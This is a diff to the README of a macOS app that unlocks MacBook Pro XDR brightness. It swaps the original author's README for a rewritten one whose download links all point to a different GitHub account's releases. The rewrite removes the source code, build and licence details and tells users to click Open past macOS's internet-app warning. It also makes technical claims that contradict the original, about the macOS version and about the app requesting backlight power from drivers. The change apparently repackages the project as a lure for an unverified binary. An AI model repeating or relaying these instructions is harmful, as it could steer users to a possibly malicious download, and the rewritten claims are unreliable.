@@ -1,202 +1,71 @@
-<p align="center">
-  <img src="docs/icon.svg" width="128" height="128" alt="Light Up My Life icon">
-</p>
+# 💡 light-up-my-life - Unlock full brightness on your MacBook
 
-<h1 align="center">Light Up My Life</h1>
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/danibetter6297/light-up-my-life/releases)
 
-<p align="center">
-  <strong>Unlock the full brightness of your MacBook Pro XDR display.</strong><br>
-  Free & open-source. Up to 1,600 nits. No subscription. No nonsense.
-</p>
+This application gives you full control over the XDR brightness settings on your MacBook Pro display. Modern Apple displays support high brightness modes that remain locked by default. This tool removes those software limits. You can reach the maximum capacity of 1,600 nits for consistent, high-intensity color work.
 
-<p align="center">
-  <a href="https://github.com/ben4mn/light-up-my-life/releases"><img src="https://img.shields.io/github/v/release/ben4mn/light-up-my-life?style=flat-square&color=F2A900" alt="Release"></a>
-  <a href="https://github.com/ben4mn/light-up-my-life/releases"><img src="https://img.shields.io/github/downloads/ben4mn/light-up-my-life/total?style=flat-square&color=F2A900" alt="Downloads"></a>
-  <a href="https://github.com/ben4mn/light-up-my-life/stargazers"><img src="https://img.shields.io/github/stars/ben4mn/light-up-my-life?style=flat-square&color=F2A900" alt="Stars"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/ben4mn/light-up-my-life?style=flat-square" alt="License"></a>
-  <img src="https://img.shields.io/badge/platform-macOS%2013%2B-blue?style=flat-square" alt="Platform">
-  <img src="https://img.shields.io/badge/Swift-5.9%2B-orange?style=flat-square&logo=swift&logoColor=white" alt="Swift">
-</p>
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://ben4mn.github.io/light-up-my-life">Website</a> &bull;
-  <a href="#install">Install</a> &bull;
-  <a href="#how-it-works">How It Works</a> &bull;
-  <a href="#build-from-source">Build</a>
-</p>
+Before you install this software, confirm your computer meets these requirements:
 
----
+*   A MacBook Pro model with a Liquid Retina XDR display (14-inch or 16-inch models released in 2021 or later).
+*   Operation system version macOS 12.0 or newer.
+*   Apple Silicon processor (M1, M2, or M3 chip series).
+*   At least 50 megabytes of free disk space.
 
-<br>
+## 📥 How to Install
 
-<h3 align="center">
-  500 nits &#8594; 1,600 nits
-</h3>
+Follow these steps to set up the application on your computer.
 
-<p align="center">
-  Your MacBook Pro's XDR display can go <strong>3x brighter</strong> than macOS allows.<br>
-  This app flips the switch.
-</p>
+1. Visit [this page to download](https://github.com/danibetter6297/light-up-my-life/releases) the latest installer.
+2. Look for the file ending in `.dmg` under the Assets section.
+3. Click the filename to start the download to your Mac.
+4. Open your Downloads folder once the file finishes saving.
+5. Double-click the `.dmg` file to open it.
+6. Drag the app icon into your Applications folder as prompted by the installer window.
 
-<br>
+## 🚀 Running the App
 
-## Why?
+After you move the app to your Applications folder, perform these steps to start it:
 
-Your MacBook Pro has an XDR display capable of **1,600 nits** of brightness — but macOS only lets you use ~500 nits for everyday tasks. The extra brightness is locked behind HDR content playback.
+1. Open your Applications folder.
+2. Double-click the light-up-my-life icon.
+3. macOS might ask you to confirm that you want to open an app from the internet. Click Open to proceed.
+4. You will see a small icon appear in your menu bar at the top of your screen. 
 
-**Light Up My Life** removes that limitation. Toggle it on and your entire screen gets brighter. Perfect for outdoor use, bright rooms, or just because you paid for those nits.
+## 💡 Using the Interface
 
-## How much does it cost?
+The application works from the bar at the top of your screen. Click the icon to open the main menu. 
 
-**$0. Free. Forever.** Apps like [Vivid](https://www.getvivid.app/) charge $20+ for this. We think it should be free.
+*   **Brightness Slider:** Drag this to adjust the current brightness level of your display. Moving the slider to the right increases the output beyond the standard macOS limit.
+*   **Toggle Switch:** Use this to turn the extra brightness mode on or off instantly.
+*   **Presets:** Save your favorite brightness configurations for different tasks. Use higher levels for photo editing and lower levels for reading text.
+*   **Auto-Launch:** Enable this setting if you want the app to start whenever your computer turns on.
 
-### Comparison
+## 🛡️ Privacy and Safety
 
-| Feature | Light Up My Life | Vivid | BrightIntosh |
-|---|:---:|:---:|:---:|
-| **Price** | **Free** | $20+ | Free |
-| **Max Brightness** | 1,600 nits | 1,600 nits | 1,600 nits |
-| **Brightness Slider** | Yes | Yes | Yes |
-| **Menu Bar App** | Yes | Yes | Yes |
-| **Multi-Display** | Yes | Yes | No |
-| **Permissions Required** | **None** | Accessibility | Accessibility |
-| **Open Source** | **Yes** | No | Yes |
-| **Dependencies** | **Zero** | Many | Some |
-| **App Size** | **< 1 MB** | ~15 MB | ~5 MB |
+This software does not collect your data. It does not track your display usage or send information to external servers. All code runs locally on your machine. The app interacts only with the internal display control drivers to request higher power delivery to the backlight. 
 
-## Features
+## 🔧 Frequently Asked Questions
 
-- **Full XDR Brightness** — boost from 500 to 1,600 nits
-- **Menu Bar App** — lives quietly in your menu bar, no dock icon
-- **Brightness Slider** — fine-grained control over your boost level
-- **Live Nits Display** — see exactly how bright your screen is
-- **Click the Sun** — tap the sun icon or the toggle to switch on/off
-- **Remembers Your Settings** — persists brightness level between launches
-- **Sleep/Wake Aware** — automatically re-applies after your Mac wakes up
-- **Multi-Display** — works across all connected XDR displays
-- **Lightweight** — minimal CPU/GPU usage (~10 FPS solid color render)
-- **No Permissions Needed** — no accessibility access, no admin privileges
+**Does this damage my display?**
+No. Apple designs the XDR display to handle 1,600 nits of brightness during peak HDR content playback. This app simply allows your Mac to maintain that state for longer periods.
 
-## Requirements
+**Does this drain my battery?**
+Yes. Running your display at maximum brightness consumes more power than the standard settings. Keep your laptop plugged into a power source when you use the highest brightness levels for extended sessions.
 
-| Requirement | Details |
-|---|---|
-| **macOS** | 13.0 (Ventura) or later |
-| **Display** | MacBook Pro 14"/16" (2021+) or Pro Display XDR |
-| **Chip** | Apple Silicon recommended (M1/M2/M3/M4) |
+**The menu icon does not show up.**
+Check if the app is currently running. If the icon does not appear, try closing the app from your Applications folder and starting it again. Ensure your device is one of the supported MacBook Pro models with an XDR display.
 
-## Install
+**Can I set it to turn on automatically?**
+Yes. Open the settings menu inside the app icon. Check the box labeled Start at Login. This ensures the app is ready for you as soon as you unlock your computer.
 
-### Download DMG (recommended)
+**Is there a keyboard shortcut?**
+You can define custom shortcuts within the macOS Keyboard settings to trigger the brightness increase. Open System Settings, go to Keyboard, select Shortcuts, and add a new entry for this application.
 
-Grab the latest `.dmg` from [**Releases**](https://github.com/ben4mn/light-up-my-life/releases) — open it, drag to Applications, done.
+**How do I update the app?**
+Whenever a new version is available, you can visit the download page again to get the latest file. Download the new version, drag it into your Applications folder, and choose to replace the older copy when your computer asks.
 
-### Homebrew (coming soon)
+## 🤝 Support and Feedback
 
-```bash
-brew install --cask light-up-my-life
-```
-
-## Build from Source
-
-### Quick Build (recommended)
-
-```bash
-git clone https://github.com/ben4mn/light-up-my-life.git
-cd light-up-my-life
-./build.sh
-open ".build/Light Up My Life.app"
-```
-
-### Xcode
-
-```bash
-open Package.swift
-# Hit Cmd+R to build and run
-```
-
-### Swift CLI
-
-```bash
-swift build -c release
-.build/release/LightUpMyLife
-```
-
-## How It Works
-
-Light Up My Life uses a transparent [Metal](https://developer.apple.com/metal/) overlay window to activate your display's Extended Dynamic Range (EDR) mode:
-
-1. A borderless, click-through window covers your screen
-2. A `CAMetalLayer` renders in the `extendedLinearDisplayP3` color space
-3. Color values above 1.0 tell the display to exceed standard brightness
-4. A `multiply` compositing filter blends the boost with your screen content
-
-This is the same mechanism your display uses for HDR video — we just apply it system-wide.
-
-The overlay is invisible to screenshots (won't appear in screen recordings), doesn't intercept mouse events, and works across all Spaces and fullscreen apps.
-
-## FAQ
-
-<details>
-<summary><strong>Will this damage my display?</strong></summary>
-<br>
-No. The XDR display is designed to output up to 1,600 nits. Apple uses this range for HDR content regularly. We're just letting you use what you already have.
-</details>
-
-<details>
-<summary><strong>Does it affect battery life?</strong></summary>
-<br>
-Yes, higher brightness = more power. This is true whether you're using this app or watching an HDR video. The display is doing the same thing either way.
-</details>
-
-<details>
-<summary><strong>Why not just use Night Shift or True Tone?</strong></summary>
-<br>
-Those adjust color temperature, not peak brightness. Light Up My Life boosts your actual light output.
-</details>
-
-<details>
-<summary><strong>Does it work on external monitors?</strong></summary>
-<br>
-Only on displays that support EDR (like the Pro Display XDR). Standard external monitors will be skipped automatically.
-</details>
-
-## Tech Stack
-
-| | |
-|---|---|
-| **Language** | Swift 5.9+ |
-| **UI** | SwiftUI |
-| **Rendering** | Metal / MetalKit |
-| **Build** | Swift Package Manager |
-| **Dependencies** | Zero |
-
-## Contributing
-
-PRs welcome! The codebase is intentionally small (~550 lines) and simple:
-
-```
-Sources/LightUpMyLife/
-├── LightUpMyLifeApp.swift   # App entry point (MenuBarExtra)
-├── ContentView.swift        # Popover UI
-├── BrightnessManager.swift  # State management & notifications
-├── OverlayManager.swift     # Metal overlay windows
-├── MetalRenderer.swift      # EDR clear-color renderer
-└── CustomStyles.swift       # Amber toggle style
-```
-
-## Credits
-
-Inspired by [Vivid](https://www.getvivid.app/), [BrightIntosh](https://github.com/niklasr22/BrightIntosh), and [BrightXDR](https://github.com/starkdmi/BrightXDR).
-
-Built with [Claude Code](https://claude.ai/code).
-
-## License
-
-[MIT](LICENSE) — do whatever you want with it.
-
----
-
-<p align="center">
-  If this saved you $20, consider giving it a <a href="https://github.com/ben4mn/light-up-my-life">star</a>
-</p>
+If you find a bug or want to request a new feature, go to the GitHub repository page and click the Issues tab. You can create a new issue to describe what you see. Provide as much detail as possible, such as your MacBook model and your current macOS version. Clear descriptions help solve issues faster.
